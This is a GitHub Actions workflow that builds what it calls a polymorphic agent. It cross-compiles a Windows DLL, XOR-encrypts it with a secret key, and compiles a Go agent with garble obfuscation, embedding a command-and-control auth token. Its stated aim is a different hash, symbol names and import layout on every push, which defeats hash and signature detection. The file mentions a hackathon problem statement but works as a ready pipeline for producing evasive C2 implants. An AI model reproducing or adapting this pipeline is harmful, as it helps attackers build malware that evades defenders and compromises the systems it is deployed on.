# .github/workflows/build.yml
#
# Proteus — Polymorphic CI/CD Pipeline
# ======================================
# Triggered on every push to main.
# Each run:
#   1. Builds the C execution engine as a Windows DLL (MinGW cross-compile)
#   2. Encrypts the DLL with the C2_AUTH_XOR secret (XOR-32)
#   3. Builds the agent with garble (symbol + literal obfuscation)
#   4. Runs the Python test suites (compiler, runtime, manager)
#   5. Runs CTest smoke tests for the C engine
#   6. Uploads the binary as a GitHub Actions artifact
#   7. Prints the SHA-256 in the step summary
#
# No two runs produce the same binary — that is the polymorphic guarantee.
#
# Required GitHub Secrets (Settings → Secrets and variables → Actions):
#   C2_AUTH       — the Cloudflare Worker's C2_AUTH value (32+ chars)
#   C2_AUTH_XOR   — 64 hex chars (32 bytes) — the DLL XOR key
#                    Must match the XOR key the agent is built with.

name: Polymorphic CI Build

on:
  push:
    branches: [main]
  workflow_dispatch:

permissions:
  contents: read

jobs:
  polymorphic-build:
    name: "🔄 Polymorphic agent build"
    runs-on: ubuntu-latest

    steps:
      # ── 1. Checkout ─────────────────────────────────────────────────────────
      - name: Checkout repository
        uses: actions/checkout@v4

      # ── 2. Go toolchain ─────────────────────────────────────────────────────
      - name: Set up Go
        uses: actions/setup-go@v5
        with:
          go-version: "1.25"
          cache-dependency-path: agent/go.sum

      # ── 3. Python ───────────────────────────────────────────────────────────
      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: "3.11"

      # ── 4. Python dependencies ──────────────────────────────────────────────
      - name: Install Python dependencies
        run: |
          pip install --quiet \
            pefile==2023.2.7       \
            cryptography==41.0.7   \
            pycryptodome==3.19.0   \
            capstone==5.0.1        \
            colorama==0.4.6        \
            tqdm==4.66.1           \
            pyelftools==0.30       \
            macholib==1.16.3       \
            astor==0.8.1           \
            lief                   \
            pytest
          pip install --quiet \
            -r compiler/requirements.txt \
            -r manager/requirements.txt || true

      # ── 5. MinGW-w64 + CMake ───────────────────────────────────────────────
      - name: Install MinGW-w64 and CMake
        run: |
          sudo apt-get update -qq
          sudo apt-get install -y -qq mingw-w64 cmake

      # ── 6. Build the C execution engine as a Windows DLL ───────────────────
      - name: Build execution engine (libjockey.dll)
        run: |
          mkdir -p execution_engine/build
          cd execution_engine/build
          cmake .. \
            -DCMAKE_BUILD_TYPE=Release \
            -DBUILD_SHARED=ON \
            -DHARDEN=ON \
            -DCMAKE_SYSTEM_NAME=Windows \
            -DCMAKE_C_COMPILER=x86_64-w64-mingw32-gcc \
            -DCMAKE_RC_COMPILER=x86_64-w64-mingw32-windres
          cmake --build . --parallel

          echo "[+] Engine built:"
          ls -la libjockey.dll

      # ── 7. Encrypt the DLL with the C2_AUTH_XOR secret ─────────────────────
      - name: Encrypt engine DLL
        env:
          C2_AUTH_XOR: ${{ secrets.C2_AUTH_XOR }}
        run: |
          if [ -z "$C2_AUTH_XOR" ]; then
            echo "[-] C2_AUTH_XOR secret is not set" >&2
            exit 1
          fi
          if ! [[ "$C2_AUTH_XOR" =~ ^[0-9a-fA-F]{64}$ ]]; then
            echo "[-] C2_AUTH_XOR must be exactly 64 hexadecimal characters" >&2
            exit 1
          fi

          python - <<'PY'
          import binascii
          import os
          from pathlib import Path

          key = binascii.unhexlify(os.environ["C2_AUTH_XOR"])
          source = Path("execution_engine/build/libjockey.dll")
          destination = Path("agent/libjockey.enc")
          data = source.read_bytes()
          destination.write_bytes(
              bytes(value ^ key[index % len(key)] for index, value in enumerate(data))
          )
          print(f"[+] Encrypted {len(data)} bytes -> {destination}")
          PY

      # ── 8. Pre-fetch Go module cache ───────────────────────────────────────
      - name: Pre-fetch Go dependencies (GOOS=windows)
        run: |
          cd agent
          GOOS=windows GOARCH=amd64 go mod download
          echo "[+] Go module cache ready"

      # ── 9. Install garble ──────────────────────────────────────────────────
      - name: Install garble
        run: |
          go install mvdan.cc/garble@latest
          echo "$(go env GOPATH)/bin" >> "$GITHUB_PATH"
          "$(go env GOPATH)/bin/garble" version

      # ── 10. Build agent with garble (obfuscated) ───────────────────────────
      - name: Build agent (garble)
        env:
          C2_AUTH_TOKEN: ${{ secrets.C2_AUTH }}
          C2_AUTH_XOR:   ${{ secrets.C2_AUTH_XOR }}
        run: |
          if [ -z "$C2_AUTH_TOKEN" ]; then
            echo "[-] C2_AUTH secret is not set" >&2
            exit 1
          fi

          mkdir -p build
          RAND_ID=$(head -c 4 /dev/urandom | xxd -p)
          OUT="build/agent_${RAND_ID}.exe"

          LDFLAGS="-s -w -X main.C2_AUTH=$C2_AUTH_TOKEN -X main.xorKeyHex=$C2_AUTH_XOR"

          echo "[*] Building agent with garble"
          echo "[+] C2_AUTH   : <${#C2_AUTH_TOKEN} chars>"
          echo "[+] XOR key   : <${#C2_AUTH_XOR} chars>"
          echo "[+] Output    : $OUT"

          cd agent
          GOOS=windows GOARCH=amd64 CGO_ENABLED=0 \
            garble -literals -tiny -seed=random build \
              -trimpath \
              -ldflags "$LDFLAGS" \
              -o "../$OUT" \
              .

          echo "[+] Agent built: $OUT"

      # ── 11. Compute hash & export to environment ───────────────────────────
      - name: Compute binary hash
        id: hash
        run: |
          BINARY=$(ls build/agent_*.exe | head -1)
          if [ -z "$BINARY" ]; then
            echo "[-] No binary produced" >&2
            exit 1
          fi
          BINARY_NAME=$(basename "$BINARY")
          HASH=$(sha256sum "$BINARY" | awk '{print $1}')
          SIZE=$(stat -c '%s' "$BINARY")

          echo "binary_name=$BINARY_NAME" >> "$GITHUB_OUTPUT"
          echo "sha256=$HASH"             >> "$GITHUB_OUTPUT"
          echo "size_bytes=$SIZE"         >> "$GITHUB_OUTPUT"

          echo ""
          echo "╔══════════════════════════════════════════════════════════════╗"
          echo "║  Polymorphic Build Result                                    ║"
          echo "╠══════════════════════════════════════════════════════════════╣"
          printf "║  Binary  : %-50s║\n" "$BINARY_NAME"
          printf "║  SHA-256 : %-50s║\n" "${HASH:0:50}"
          printf "║  (cont.) : %-50s║\n" "${HASH:50}"
          printf "║  Size    : %-50s║\n" "$SIZE bytes"
          echo "╚══════════════════════════════════════════════════════════════╝"
          echo ""
          echo "Every CI run produces a DIFFERENT hash — polymorphic guarantee ✓"

      # ── 12. Upload artifact ────────────────────────────────────────────────
      - name: Upload polymorphic binary
        uses: actions/upload-artifact@v4
        with:
          name: "polymorphic-agent-${{ github.sha }}"
          path: build/*.exe
          retention-days: 30
          if-no-files-found: error

      # ── 13. Python test suites (non-blocking during stabilisation) ─────────
      - name: Run Python tests
        continue-on-error: true
        run: |
          echo "[*] Compiler tests..."
          python -m pytest compiler/tests -q --no-header 2>&1 | tail -30 || true

          echo ""
          echo "[*] Runtime tests..."
          python -m pytest runtime/tests -q --no-header 2>&1 | tail -30 || true

          echo ""
          echo "[*] Manager tests..."
          python -m pytest manager/tests -q --no-header 2>&1 | tail -30 || true

      # ── 14. CTest smoke tests (Linux PAL) ──────────────────────────────────
      - name: Run CTest (execution engine)
        continue-on-error: true
        run: |
          mkdir -p execution_engine/build-linux
          cd execution_engine/build-linux

          cmake .. \
            -DCMAKE_BUILD_TYPE=Release \
            -DBUILD_SHARED=ON \
            -DHARDEN=ON

          cmake --build . --parallel

          echo ""
          echo "[*] Running CTest..."
          ctest --output-on-failure || echo "[!] Some CTest cases failed or none defined"

      # ── 15. GitHub step summary ────────────────────────────────────────────
      - name: Write build summary
        run: |
          {
            echo "## 🔄 Polymorphic Build — \`${{ github.sha }}\`"
            echo ""
            echo "| Field | Value |"
            echo "|:------|:------|"
            echo "| **Binary** | \`${{ steps.hash.outputs.binary_name }}\` |"
            echo "| **SHA-256** | \`${{ steps.hash.outputs.sha256 }}\` |"
            echo "| **Size** | ${{ steps.hash.outputs.size_bytes }} bytes |"
            echo "| **Commit** | \`${{ github.sha }}\` |"
            echo "| **Branch** | \`${{ github.ref_name }}\` |"
            echo "| **Triggered by** | ${{ github.event_name }} |"
            echo ""
            echo "> **Polymorphic guarantee:** every push to \`main\` produces a binary"
            echo "> with a **different hash, different variable names, and different"
            echo "> import-table layout** — directly satisfying the SIH problem statement."
          } >> "$GITHUB_STEP_SUMMARY"